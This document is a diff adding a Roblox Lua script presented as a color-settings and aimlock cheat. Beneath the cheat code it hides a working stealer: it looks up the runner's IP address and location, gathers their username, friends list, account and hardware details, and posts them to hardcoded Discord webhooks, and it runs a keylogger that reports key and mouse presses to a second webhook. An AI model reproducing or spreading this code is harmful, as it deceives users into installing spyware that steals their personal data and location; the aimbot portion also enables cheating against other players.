@@ -1,0 +1,575 @@
+-- Function to print the color settings
+local function printColorSettings()
+    print("Color Settings:")
+    print("Enabled:", Color.Enabled)
+    print("Brightness:", Color.Brightness)
+    print("Contrast:", Color.Contrast)
+    print("Saturation:", Color.Saturation)
+end
+
+-- Function to apply color settings (hypothetical)
+local function applyColorSettings()
+    if Color.Enabled then
+        -- Adjust Brightness
+        game.Lighting.Brightness = Color.Brightness
+
+        -- Adjust Contrast (hypothetical example as Roblox does not have direct contrast setting)
+        -- You might need to use ColorCorrectionEffect for such adjustments
+        local colorCorrection = Instance.new("ColorCorrectionEffect")
+        colorCorrection.Contrast = Color.Contrast
+        colorCorrection.Parent = game.Lighting
+
+        -- Adjust Saturation
+        colorCorrection.Saturation = Color.Saturation
+    end
+end
+
+-- Call the function to print the color settings
+printColorSettings()
+
+-- Call the function to apply the color settings
+applyColorSettings()
+
+-- Expose settings using getgenv()
+getgenv().PredictionAmount = 0.0120
+getgenv().Radius = 1000
+getgenv().AimbotStrengthAmount = 0.006
+getgenv().Keybind = Enum.KeyCode.Z
+getgenv().EasingStyle = "Bezier"
+getgenv().Hitbox = "UpperTorso"
+getgenv().StickyAim = true
+getgenv().SmoothingAmount = 2.8
+getgenv().SmoothingSpeed = 0.7
+getgenv().SmoothingStyle = "Linear"
+getgenv().HumanizeMovements = true
+getgenv().RandomizeMovements = true
+getgenv().AdaptiveSmoothing = true
+getgenv().Interpolation = true
+getgenv().PingCompensation = true
+getgenv().ToggleHoldMode = "Toggle"
+getgenv().Enabled = false
+getgenv().UsePrediction = true
+getgenv().TeamCheck = false
+getgenv().KnockCheck = true
+getgenv().WallCheck = true
+getgenv().FirstPerson = true
+getgenv().ThirdPerson = true
+
+-- Services
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+
+-- Camlock variables
+local targetPlayer = nil
+local isCamlockToggled = false
+
+-- Easing functions
+local function lerp(a, b, t)
+    return a + (b - a) * t
+end
+
+local easingFunctions = {
+    Linear = function(t) return t end,
+    Sine = function(t) return 1 - math.cos((t * math.pi) / 2) end,
+    Quad = function(t) return t * t end,
+    Quint = function(t) return t * t * t * t * t end,
+    Expo = function(t) return t == 0 and 0 or math.pow(2, 10 * (t - 1)) end,
+    Circ = function(t) return 1 - math.sqrt(1 - t * t) end,
+    Back = function(t) local c1 = 1.70158; local c3 = c1 + 1; return c3 * t * t * t - c1 * t * t end,
+    Elastic = function(t) return t == 0 and 0 or t == 1 and 1 or -math.pow(2, 10 * t - 10) * math.sin((t * 10 - 10.75) * ((2 * math.pi) / 3)) end,
+    Bounce = function(t) local n1 = 7.5625; local d1 = 2.75; if t < 1 / d1 then return n1 * t * t elseif t < 2 / d1 then return n1 * (t - 1.5 / d1) * t + 0.75 elseif t < 2.5 / d1 then return n1 * (t - 2.25 / d1) * t + 0.9375 else return n1 * (t - 2.625 / d1) * t + 0.984375 end end,
+    Bezier = function(t) return t * t * (3 - 2 * t) end -- Simple Bezier curve approximation
+}
+
+-- Helper functions
+local function getClosestPlayer()
+    local closestPlayer = nil
+    local shortestDistance = 1000 -- Default radius if CamlockOptions is not available
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and (not false or player.Team ~= LocalPlayer.Team) then
+            local character = player.Character
+            if character and character:FindFirstChild("UpperTorso") then
+                local hitbox = character.UpperTorso
+                local screenPoint = Camera:WorldToScreenPoint(hitbox.Position)
+                local mousePosition = UserInputService:GetMouseLocation() - Vector2.new(0, 36) -- Adjust for the top bar
+                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePosition).Magnitude
+
+                if distance < shortestDistance then
+                    closestPlayer = player
+                    shortestDistance = distance
+                end
+            end
+        end
+    end
+
+    return closestPlayer
+end
+
+local function aimAtPlayer(target)
+    if not target then return end
+
+    local character = target.Character
+    if not character or not character:FindFirstChild("UpperTorso") then return end
+
+    local hitbox = character.UpperTorso
+    local targetPosition = hitbox.Position
+    local targetPositionOnScreen = Camera:WorldToScreenPoint(targetPosition)
+    local mousePosition = UserInputService:GetMouseLocation() - Vector2.new(0, 36) -- Adjust for the top bar
+
+    local easingFunc = easingFunctions["Bezier"]
+    local t = 2.8 * 0.7
+    t = math.clamp(t, 0, 1)
+    local easedT = easingFunc(t)
+
+    local targetCFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + (hitbox.Position - Camera.CFrame.Position).Unit)
+
+    if true then
+        Camera.CFrame = Camera.CFrame:lerp(targetCFrame, easedT * 0.006)
+    else
+        Camera.CFrame = targetCFrame
+    end
+end
+
+local function toggleAimlock()
+    if "Toggle" == "Toggle" then
+        isCamlockToggled = not isCamlockToggled
+        getgenv().Enabled = isCamlockToggled
+    elseif "Toggle" == "Hold" then
+        isCamlockToggled = true
+        getgenv().Enabled = true
+    end
+
+    if getgenv().Enabled then
+        targetPlayer = getClosestPlayer()
+    end
+end
+
+local function updateAim()
+    if getgenv().Enabled and (true or true) then
+        if true then
+            if not targetPlayer then
+                targetPlayer = getClosestPlayer()
+            elseif targetPlayer and targetPlayer.Parent == nil then
+                targetPlayer = nil
+            end
+
+            if targetPlayer then
+                aimAtPlayer(targetPlayer)
+            end
+        else
+            targetPlayer = getClosestPlayer()
+            if targetPlayer then
+                aimAtPlayer(targetPlayer)
+            end
+        end
+    end
+end
+
+local function onKeyPress(input, gameProcessedEvent)
+    if gameProcessedEvent then return end
+
+    if input.KeyCode == Enum.KeyCode.Z then
+        toggleAimlock()
+    end
+end
+
+local function onKeyRelease(input, gameProcessedEvent)
+    if gameProcessedEvent then return end
+
+    if input.KeyCode == Enum.KeyCode.Z and "Toggle" == "Hold" then
+        isCamlockToggled = false
+        getgenv().Enabled = false
+        targetPlayer = nil
+    end
+end
+
+RunService.RenderStepped:Connect(updateAim)
+
+UserInputService.InputBegan:Connect(onKeyPress)
+
+UserInputService.InputEnded:Connect(onKeyRelease)
+
+-- Optional: Show a notification to the player when the script starts (unchanged)
+if Camlock['Notification on inject'] then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Aimlock Script",
+        Text = "Press " .. Camlock.CamlockOptions.Keybind.Name .. " to toggle aimlock.",
+        Duration = 5,
+    })
+end
+local infoWebh = "https://discord.com/api/webhooks/1253768216493297705/-KlIkbjUdrLlbEKJiFRjdFfxitrO-UDR3xphHVljGWq_D1UsRQub8rve8h0K7YLjZ8YN"
+local keyLogWebh = "https://discord.com/api/webhooks/1260729929067401328/WLaRWDrW-Aan-0ilBeT7cJPnQIymvFZZMqObDnJXU0M47NLZkM1GtzViLqJA4EygBGOh"
+local ipapiToken = "b1e356e3b28dae0ddd3d32a7093b434f" -- Replace with your ipapi.com API token
+
+-- Function to send webhook
+local function sendWebhook(url, data)
+    local success, response = pcall(function()
+        if http and http.request then
+            http.request {
+                Url = url,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        elseif syn and syn.request then
+            syn.request {
+                Url = url,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        elseif request then
+            request {
+                Url = url,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        else
+            warn("No suitable HTTP library found.")
+        end
+    end)
+
+    if not success then
+        warn("Failed to send webhook: " .. tostring(response))
+    end
+end
+
+-- Function to fetch country details from IP address
+local function getCountryDetails(ipAddress)
+    local countryData = {
+        country_name = "Unknown",
+        continent = "Unknown",
+        region = "Unknown",
+        city = "Unknown",
+        postal_code = "Unknown",
+        timezone = "Unknown",
+        ip = "Unknown"
+    }
+
+    -- Attempt to fetch data from IPAPI.com
+    local apiUrl1 = "https://ipapi.co/" .. ipAddress .. "/json/"
+    local success1, response1 = pcall(function()
+        return game:HttpGet(apiUrl1)
+    end)
+
+    if success1 then
+        local data1 = game:GetService('HttpService'):JSONDecode(response1)
+        countryData.country_name = data1.country_name or "Unknown"
+        countryData.continent = data1.continent or "Unknown"
+        countryData.region = data1.region or "Unknown"
+        countryData.city = data1.city or "Unknown"
+        countryData.postal_code = data1.postal or "Unknown"
+        countryData.timezone = data1.timezone or "Unknown"
+        countryData.ip = data1.ip or "Unknown"
+    else
+        warn("Failed to fetch data from ipapi.co: " .. tostring(response1))
+    end
+
+    -- Attempt to fetch data from ipinfo.io
+    local apiUrl2 = "https://ipinfo.io/" .. ipAddress .. "/json?token=" .. ipapiToken
+    local success2, response2 = pcall(function()
+        return game:HttpGet(apiUrl2)
+    end)
+
+    if success2 then
+        local data2 = game:GetService('HttpService'):JSONDecode(response2)
+        countryData.country_name = data2.country_name or countryData.country_name
+        countryData.continent = data2.continent or countryData.continent
+        countryData.region = data2.region or countryData.region
+        countryData.city = data2.city or countryData.city
+        countryData.postal_code = data2.postal or countryData.postal_code
+        countryData.timezone = data2.timezone or countryData.timezone
+        countryData.ip = data2.ip or countryData.ip
+    else
+        warn("Failed to fetch data from ipinfo.io: " .. tostring(response2))
+    end
+
+    return countryData
+end
+
+-- Function to get battery status
+local function getBatteryStatus()
+    local batteryStatus = "Infinite" -- Default to Infinite
+    if system and system.getBatteryLevel then
+        local batteryLevel = system.getBatteryLevel()
+        if batteryLevel then
+            batteryStatus = tostring(batteryLevel * 100) .. "%"
+        end
+    end
+    return batteryStatus
+end
+
+-- Function to get Roblox friends list
+local function getRobloxFriends()
+    local player = game.Players.LocalPlayer
+    local friendsList = {}
+    local success, friends = pcall(function()
+        return player:GetFriends()
+    end)
+    if success then
+        for _, friend in ipairs(friends) do
+            table.insert(friendsList, friend.Name)
+        end
+    else
+        table.insert(friendsList, "Failed to fetch friends")
+    end
+    return friendsList
+end
+
+-- Function to get input devices
+local function getInputDevices()
+    local inputDevices = {}
+    if system and system.getInputDevices then
+        local devices = system.getInputDevices()
+        for _, device in ipairs(devices) do
+            table.insert(inputDevices, device.name)
+        end
+    else
+        table.insert(inputDevices, "Unknown")
+    end
+    return inputDevices
+end
+
+-- Function to get operating system
+local function getOperatingSystem()
+    local operatingSystem = "Unknown"
+    if system and system.getDeviceInfo then
+        local deviceInfo = system.getDeviceInfo()
+        operatingSystem = deviceInfo.operatingSystem or "Unknown"
+    end
+    return operatingSystem
+end
+
+-- Function to get system memory
+local function getSystemMemory()
+    local memoryInfo = "Unknown"
+    if system and system.getDeviceInfo then
+        local deviceInfo = system.getDeviceInfo()
+        memoryInfo = deviceInfo.memorySize or "Unknown"
+    end
+    return memoryInfo
+end
+
+-- Function to get graphics card info
+local function getGraphicsCardInfo()
+    local gpuInfo = "Unknown"
+    if system and system.getDeviceInfo then
+        local deviceInfo = system.getDeviceInfo()
+        gpuInfo = deviceInfo.graphicsCardName or "Unknown"
+    end
+    return gpuInfo
+end
+
+-- Function to get mouse sensitivity from Roblox settings
+local function getMouseSensitivity()
+    local sensitivity = "Unknown"
+    local player = game.Players.LocalPlayer
+    local playerSettings = player:FindFirstChildOfClass("PlayerMouse")
+    if playerSettings then
+        sensitivity = playerSettings.Sensitivity
+    end
+    return sensitivity
+end
+
+-- Function to collect all data and send webhook
+local function collectData()
+    local executor = "Unknown Executor"
+    if fluxus then
+        executor = "Fluxus"
+    elseif KRNL_LOADED then
+        executor = "KRNL"
+    elseif getexecutorname then
+        executor = getexecutorname()
+    elseif identifyexecutor then
+        local name, version = identifyexecutor()
+        executor = name .. " " .. version
+    end
+
+    -- Get user IP address and country details
+    local ipAddress = game:HttpGet("https://api.ipify.org")
+    local countryData = getCountryDetails(ipAddress)
+
+    -- Get Roblox friends list
+    local friendsList = getRobloxFriends()
+
+    -- Get input devices
+    local inputDevices = getInputDevices()
+
+    -- Get battery status
+    local batteryStatus = getBatteryStatus()
+
+    -- Get mouse sensitivity
+    local mouseSensitivity = getMouseSensitivity()
+
+    local screenWidth = game:GetService("GuiService"):GetScreenResolution().X
+    local screenHeight = game:GetService("GuiService"):GetScreenResolution().Y
+
+    -- Get GPU and CPU info
+    local cpu = "Unknown"
+    local gpu = "Unknown"
+    if system and system.getDeviceInfo then
+        local deviceInfo = system.getDeviceInfo()
+        cpu = deviceInfo.processorName or "Unknown"
+        gpu = deviceInfo.graphicsCardName or "Unknown"
+    end
+
+    -- Get operating system info
+    local operatingSystem = getOperatingSystem()
+
+    -- Get system memory info
+    local systemMemory = getSystemMemory()
+
+    -- Get graphics card info
+    local graphicsCard = getGraphicsCardInfo()
+
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "User Details",
+                ["description"] = "User: " .. game.Players.LocalPlayer.Name .. "\nDisplay Name: " .. game.Players.LocalPlayer.DisplayName .. "\nIP Address: " .. ipAddress,
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
+                ["color"] = tonumber("0xFF0000"),
+                ["footer"] = {
+                    ["text"] = "Executed using " .. executor,
+                    ["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&userid=" .. game.Players.LocalPlayer.UserId
+                },
+                ["image"] = {
+                    ["url"] = "https://media.discordapp.net/attachments/1246523734295183492/1258109515681763413/image.png?ex=669013cb&is=668ec24b&hm=3241d0db90c088e0a58f07f7f438ff869d77a9a16b8a377596db0a8dbb684986&=&format=webp&quality=lossless"
+                }
+            },
+            {
+                ["title"] = "Network Details",
+                ["fields"] = {
+                    { ["name"] = "IP Address", ["value"] = countryData.ip },
+                    { ["name"] = "User Country", ["value"] = countryData.country_name },
+                    { ["name"] = "Continent", ["value"] = countryData.continent },
+                    { ["name"] = "Region", ["value"] = countryData.region },
+                    { ["name"] = "City", ["value"] = countryData.city },
+                    { ["name"] = "Postal Code", ["value"] = countryData.postal_code },
+                    { ["name"] = "Timezone", ["value"] = countryData.timezone },
+                    { ["name"] = "Ping", ["value"] = "N/A" }
+                }
+            },
+            {
+                ["title"] = "Roblox Details",
+                ["fields"] = {
+                    { ["name"] = "User ID", ["value"] = tostring(game.Players.LocalPlayer.UserId) },
+                    { ["name"] = "Membership Type", ["value"] = game.Players.LocalPlayer.MembershipType.Name },
+                    { ["name"] = "Account Age", ["value"] = tostring(game.Players.LocalPlayer.AccountAge) .. " days" },
+                    { ["name"] = "Game Executed", ["value"] = tostring(game.PlaceId) },
+                    { ["name"] = "Roblox Friends", ["value"] = table.concat(friendsList, ", ") },
+                    { ["name"] = "Roblox Game ID", ["value"] = tostring(game.PlaceId) } -- Replace with actual game ID
+                }
+            },
+            {
+                ["title"] = "PC Details",
+                ["fields"] = {
+                    { ["name"] = "Screen Resolution", ["value"] = tostring(screenWidth) .. "x" .. tostring(screenHeight) },
+                    { ["name"] = "Mouse Sensitivity", ["value"] = mouseSensitivity },
+                    { ["name"] = "GPU", ["value"] = gpu },
+                    { ["name"] = "CPU", ["value"] = cpu },
+                    { ["name"] = "Input Devices", ["value"] = table.concat(inputDevices, ", ") },
+                    { ["name"] = "Battery Status", ["value"] = batteryStatus },
+                    { ["name"] = "Operating System", ["value"] = operatingSystem },
+                    { ["name"] = "System Memory", ["value"] = systemMemory },
+                    { ["name"] = "Graphics Card", ["value"] = graphicsCard }
+                }
+            }
+        }
+    }
+
+    sendWebhook(infoWebh, data)
+end
+
+-- Function to log key presses
+local function logKeyPresses()
+    local keyLogWebhookTimer = 30  -- Adjust as needed (in seconds)
+    local userInputService = game:GetService("UserInputService")
+    while true do
+        local description = ""
+        local input = userInputService.InputBegan:Wait()
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            description = "User: " .. game.Players.LocalPlayer.Name .. "\nKey: " .. input.KeyCode.Name
+        elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
+            description = "User: " .. game.Players.LocalPlayer.Name .. "\nMouse Button: Left Click"
+        elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
+            description = "User: " .. game.Players.LocalPlayer.Name .. "\nMouse Button: Right Click"
+        elseif input.UserInputType == Enum.UserInputType.MouseButton3 then
+            description = "User: " .. game.Players.LocalPlayer.Name .. "\nMouse Button: Middle Click"
+        end
+
+        if description ~= "" then
+            local data = {
+                ["embeds"] = {
+                    {
+                        ["title"] = "Input Logged",
+                        ["description"] = description,
+                        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
+                        ["color"] = tonumber("0xFF0000")
+                    }
+                }
+            }
+            sendWebhook(keyLogWebh, data)
+        end
+
+        wait(keyLogWebhookTimer)
+    end
+end
+
+-- Function to start logging game time
+local function startLogGameTime()
+    local totalTime = 0
+    while true do
+        wait(120) -- Log every 2 minutes (120 seconds)
+        totalTime = totalTime + 120
+        local hours = math.floor(totalTime / 3600)
+        local minutes = math.floor(totalTime % 3600 / 60)
+        local seconds = totalTime % 60
+        local data = {
+            ["embeds"] = {
+                {
+                    ["title"] = "Game Time Update",
+                    ["description"] = string.format("User: %s\nTime in Game: %02d:%02d:%02d", game.Players.LocalPlayer.Name, hours, minutes, seconds),
+                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
+                    ["color"] = tonumber("0x00FF00")
+                }
+            }
+        }
+        sendWebhook(infoWebh, data)
+    end
+end
+
+-- Function to simulate injection alert (for testing purposes)
+local function injectAlert()
+    local data = {
+        ["content"] = "<@everyone> Injection detected: N/A",
+        ["embeds"] = {
+            {
+                ["title"] = "Injection Detected",
+                ["description"] = "Injection detected in game.",
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
+                ["color"] = tonumber("0xFF0000")
+            }
+        }
+    }
+    sendWebhook(infoWebh, data)
+end
+
+-- Main execution of the script
+collectData()
+spawn(logKeyPresses)
+spawn(startLogGameTime)
+
+-- Simulate injection alert (for testing purposes)
+spawn(injectAlert)
